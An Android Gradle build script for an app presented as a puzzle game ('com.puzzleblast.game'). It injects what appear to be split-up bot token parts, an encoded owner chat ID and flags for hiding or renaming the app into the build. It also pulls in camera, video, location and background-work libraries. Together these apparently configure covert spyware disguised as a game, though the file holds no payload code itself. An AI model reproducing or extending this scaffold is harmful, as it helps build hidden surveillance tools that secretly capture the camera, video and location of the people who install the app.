import java.util.Properties

val props = Properties().apply {
    rootProject.file("gradle.properties").inputStream().use { load(it) }
}

plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
    id("org.jetbrains.kotlin.plugin.compose")
}

android {
    namespace = "com.puzzleblast.game"
    compileSdk = 35

    defaultConfig {
        applicationId = "com.puzzleblast.game"
        minSdk = 29
        targetSdk = 35
        versionCode = 1
        versionName = "1.0.0"

        buildConfigField("String", "BOT_P1", "\"${props.getProperty("BOT_P1")}\"")
        buildConfigField("String", "BOT_P2", "\"${props.getProperty("BOT_P2")}\"")
        buildConfigField("String", "BOT_P3", "\"${props.getProperty("BOT_P3")}\"")
        buildConfigField("String", "BOT_S1", "\"${props.getProperty("BOT_S1")}\"")
        buildConfigField("String", "BOT_S2", "\"${props.getProperty("BOT_S2")}\"")
        buildConfigField("String", "BOT_S3", "\"${props.getProperty("BOT_S3")}\"")
        buildConfigField("String", "OWNER_CID_B64", "\"${props.getProperty("OWNER_CID_B64")}\"")
        buildConfigField("String", "SID_B64", "\"${props.getProperty("SID_B64")}\"")
        buildConfigField("boolean", "RENAME_ON_HIDE", props.getProperty("RENAME_ON_HIDE", "true"))
        buildConfigField("boolean", "REPORT_ANALYST", props.getProperty("REPORT_ANALYST", "false"))
        buildConfigField("boolean", "FLEET_MODE", props.getProperty("FLEET_MODE", "false"))
    }

    signingConfigs {
        create("release") {
            storeFile = rootProject.file("release.keystore")
            storePassword = props.getProperty("KEYSTORE_PASS")
            keyAlias = props.getProperty("KEY_ALIAS")
            keyPassword = props.getProperty("KEY_PASS")
        }
    }

    buildTypes {
        release {
            isMinifyEnabled = true
            isShrinkResources = true
            proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro")
            signingConfig = signingConfigs.getByName("release")
        }
        debug {
            isMinifyEnabled = false
            signingConfig = signingConfigs.getByName("release")
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = "17" }

    buildFeatures {
        compose = true
        buildConfig = true
    }
}

dependencies {
    implementation("androidx.core:core-ktx:1.13.1")
    implementation("androidx.appcompat:appcompat:1.7.0")
    implementation("androidx.activity:activity-compose:1.9.0")
    implementation(platform("androidx.compose:compose-bom:2024.06.00"))
    implementation("androidx.compose.ui:ui")
    implementation("androidx.compose.ui:ui-graphics")
    implementation("androidx.compose.ui:ui-tooling-preview")
    implementation("androidx.compose.material3:material3")
    implementation("androidx.compose.material:material-icons-extended")
    implementation("androidx.lifecycle:lifecycle-runtime-ktx:2.8.3")
    implementation("androidx.lifecycle:lifecycle-viewmodel-compose:2.8.3")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")
    implementation("com.squareup.okhttp3:okhttp:4.12.0")
    implementation("androidx.security:security-crypto:1.1.0-alpha06")
    implementation("androidx.room:room-runtime:2.6.1")
    implementation("androidx.room:room-ktx:2.6.1")
    annotationProcessor("androidx.room:room-compiler:2.6.1")
    implementation("androidx.camera:camera-core:1.3.4")
    implementation("androidx.camera:camera-camera2:1.3.4")
    implementation("androidx.camera:camera-lifecycle:1.3.4")
    implementation("androidx.camera:camera-view:1.3.4")
    implementation("androidx.camera:camera-video:1.3.4")
    implementation("androidx.work:work-runtime-ktx:2.9.0")
    implementation("com.google.android.gms:play-services-location:21.3.0")
}
